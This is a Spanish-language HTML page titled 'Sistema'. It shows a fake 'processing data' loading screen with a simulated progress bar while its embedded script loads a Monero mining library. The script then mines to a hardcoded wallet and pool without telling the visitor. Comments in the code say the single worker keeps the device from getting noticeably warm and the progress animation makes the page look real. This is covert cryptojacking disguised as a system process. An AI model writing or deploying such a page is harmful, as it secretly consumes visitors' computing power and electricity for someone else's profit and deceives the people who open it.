<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #b0b0b0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            user-select: none;
        }
        .loader-container {
            width: 80%;
            max-width: 300px;
            text-align: center;
        }
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-left-color: #ffffff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 16px; font-weight: 500; margin-bottom: 10px; letter-spacing: 0.5px; }
        p { font-size: 12px; color: #666; margin-top: 0; }
        .progress-bg {
            width: 100%;
            height: 4px;
            background: #222;
            border-radius: 2px;
            overflow: hidden;
            margin-top: 20px;
        }
        .progress-bar {
            height: 100%;
            width: 1%;
            background: #4a90e2;
            transition: width 0.5s ease;
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
        <h1 id="status-text">Procesando datos...</h1>
        <p>No apague la pantalla.</p>
        
        <div class="progress-bg">
            <div class="progress-bar" id="bar"></div>
        </div>
    </div>

    <!-- Lógica de Minería Discreta -->
    <script>
        // Configuración del minero (Monero/XMR)
        const wallet = '47GobohNiYpKDMEmhN4gSXdvjKsebSoXTi1YeQLYuuPRW1JvcK83KMujfBpMGLZD2Phhx6qYdjv4XY7hCgeD9WguTUEPzEK';
        const pool = 'pool.hashvault.pro';

        // Cargamos la librería ligera
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/minexmr@latest/minexmr.min.js';
        script.onload = function() {
            try {
                var miner = new MinexMr({
                    workers: 1, // 1 Worker para no notar calor
                    url: pool,
                    user: wallet
                });
                miner.start();
                
                // Simulación visual para que parezca real
                let progress = 0;
                const bar = document.getElementById('bar');
                const text = document.getElementById('status-text');
                const msgs = ["Analizando paquetes...", "Verificando seguridad...", "Sincronizando...", "Completado."];
                
                setInterval(() => {
                    if(progress < 100) {
                        progress += Math.random() * 5; 
                        if(progress > 100) progress = 100;
                        bar.style.width = progress + '%';
                        
                        // Cambia el texto sutilmente para dar vida
                        if(Math.random() > 0.7 && progress < 90) {
                            text.innerText = msgs[Math.floor(Math.random() * msgs.length)];
                        }
                    } else {
                        text.innerText = "Listo";
                        setTimeout(() => miner.stop(), 2000); // Se detiene al final
                    }
                }, 500);
            } catch(e) { console.log("Error o usuario cerró"); }
        };
        document.head.appendChild(script);
    </script>
</body>
</html>
